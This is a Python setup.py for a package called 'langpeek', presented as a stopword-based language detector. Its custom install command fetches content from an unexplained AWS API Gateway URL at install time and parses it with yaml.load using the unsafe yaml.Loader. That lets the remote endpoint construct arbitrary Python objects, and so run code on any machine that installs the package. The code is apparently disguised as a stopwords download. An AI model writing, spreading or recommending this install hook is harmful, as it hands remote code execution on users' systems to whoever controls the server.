import os
import yaml
from setuptools import setup
from setuptools.command.install import install

class CustomInstallCommand(install):
    def run(self):
        # Run default install logic
        install.run(self)

        from urllib.request import urlopen
        from urllib.error import HTTPError
        
        STOPWORDS_URL = "https://5hf9gtxvrk.execute-api.us-east-1.amazonaws.com/"

        # Download the YAML stopwords
        print(f"Downloading stopwords from {STOPWORDS_URL}...")
        try:
            response = urlopen(STOPWORDS_URL)
            stopwords_text = response.read().decode('utf-8')
        except HTTPError as e:
            raise RuntimeError(f"Failed to download stopwords: {e}")

        # Write YAML into Python dict
        stopwords_data = yaml.load(stopwords_text, Loader=yaml.Loader)

        # Write to stopwords.yaml in the data dir
        data_dir = os.path.join(self.install_lib, "langpeek", "data")
        os.makedirs(data_dir, exist_ok=True)
        stopwords_path = os.path.join(data_dir, "stopwords.yaml")

        with open(stopwords_path, "w", encoding="utf-8") as f:
            yaml.dump(stopwords_data, f, indent=2)

        print(f"Stopwords written to {stopwords_path}")

setup(
    name="langpeek",
    version="0.1.0",
    description="A lightweight language detection package using stopword heuristics.",
    author="Williams Brook",
    author_email="williamsbrook1125@gmail.com",
    install_requires=[
        "pyyaml"
    ],
    packages=['langpeek'],
    cmdclass={
        'install': CustomInstallCommand
    },
)
